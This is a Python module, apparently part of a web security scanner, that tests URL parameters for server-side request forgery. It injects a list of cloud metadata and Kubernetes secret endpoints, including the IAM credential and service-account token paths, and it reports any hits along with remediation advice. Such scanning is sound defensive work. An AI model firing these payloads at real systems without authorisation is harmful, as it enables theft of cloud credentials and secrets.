#  MODULE v38-1 — Cloud Metadata SSRF Scanner
# ════════════════════════════════════════════════════════════════════════

class CloudMetadataScanner:
    """Detects SSRF paths to cloud provider metadata endpoints."""

    METADATA_ENDPOINTS = [
        # AWS IMDSv1 / IMDSv2
        ("AWS IMDSv1",     "http://169.254.169.254/latest/meta-data/",          "CRITICAL"),
        ("AWS IMDSv1 IAM", "http://169.254.169.254/latest/meta-data/iam/",      "CRITICAL"),
        ("AWS Credentials","http://169.254.169.254/latest/meta-data/iam/security-credentials/", "CRITICAL"),
        ("AWS User-Data",  "http://169.254.169.254/latest/user-data",           "HIGH"),
        # GCP
        ("GCP Metadata",   "http://metadata.google.internal/computeMetadata/v1/", "CRITICAL"),
        ("GCP Service Acct","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "CRITICAL"),
        # Azure
        ("Azure Metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "CRITICAL"),
        ("Azure Managed ID","http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "CRITICAL"),
        # DigitalOcean
        ("DO Metadata",    "http://169.254.169.254/metadata/v1/",               "HIGH"),
        # Oracle Cloud
        ("OCI Metadata",   "http://169.254.169.254/opc/v1/instance/",           "HIGH"),
        # K8s service account
        ("K8s ServiceAcct","http://kubernetes.default.svc/api/v1/namespaces/default/secrets", "CRITICAL"),
    ]

    SSRF_PARAMS = [
        "url", "uri", "path", "redirect", "next", "dest", "destination",
        "src", "source", "target", "load", "fetch", "resource", "image",
        "file", "proxy", "open", "callback", "return", "host", "endpoint",
        "domain", "webhook", "link", "ref", "page", "continue",
    ]

    async def scan(self, client: WebScoutClient, base_url: str) -> list:
        findings = []
        parsed = urlparse(base_url)
        qs = parse_qs(parsed.query)

        # Test SSRF via existing parameters
        ssrf_params = [p for p in qs if p.lower() in self.SSRF_PARAMS]
        if not ssrf_params:
            # Add suspected SSRF params as test
            ssrf_params = [p for p in self.SSRF_PARAMS
                           if p in base_url.lower()][:3]

        for name, meta_url, sev in self.METADATA_ENDPOINTS[:6]:
            for param in ssrf_params:
                np = {**qs, param: [meta_url]}
                test_url = urlunparse(parsed._replace(query=urlencode(np, doseq=True)))
                r = await client.get(test_url)
                if not r:
                    continue
                body_lower = r["text"].lower()
                hit = any(kw in body_lower for kw in [
                    "ami-id", "instance-id", "computemetadata",
                    "azure", "digitalocean", "kubernetes", "iam",
                    "169.254.169.254",
                ])
                if hit:
                    findings.append(Finding(
                        plugin="cloud_metadata",
                        title=f"Cloud SSRF — {name} via '{param}'",
                        severity=sev, confidence=92.0,
                        description=f"Parameter '{param}' fetches cloud metadata: {name}.",
                        evidence=f"Payload: {meta_url} | Status: {r['status']} | snippet: {r['text'][:120]}",
                        url=test_url, param=param, payload=meta_url,
                        remediation="Block outbound requests to 169.254.169.254 at network/app level. Use IMDSv2.",
                        cwe="CWE-918", cvss=9.8, owasp="A10",
                        poc=f"curl -sk '{test_url}'",
                        tags=["ssrf", "cloud", "metadata"],
                    ))
                    log("VULN", f"Cloud SSRF [{name}] via param={param}")

        # Direct fetch simulation: check if server echoes metadata
        for name, meta_url, sev in self.METADATA_ENDPOINTS:
            sep = "&" if "?" in base_url else "?"
            test = base_url.rstrip("/") + sep + "url=" + quote(meta_url)
            r = await client.get(test)
            if r and any(kw in r["text"].lower() for kw in ["ami-id", "instance-id", "computemetadata"]):
                findings.append(Finding(
                    plugin="cloud_metadata",
                    title=f"Direct Cloud Metadata Exposure — {name}",
                    severity=sev, confidence=95.0,
                    description=f"Server returns cloud metadata content ({name}).",
                    evidence=r["text"][:200],
                    url=test, payload=meta_url,
                    remediation="Block metadata endpoints. Use network-level restrictions.",
                    cwe="CWE-918", cvss=9.8, owasp="A10",
                    tags=["ssrf", "cloud", "metadata"],
                ))

        log("OK", f"Cloud metadata scan done — {len(findings)} finding(s)")
        return findings


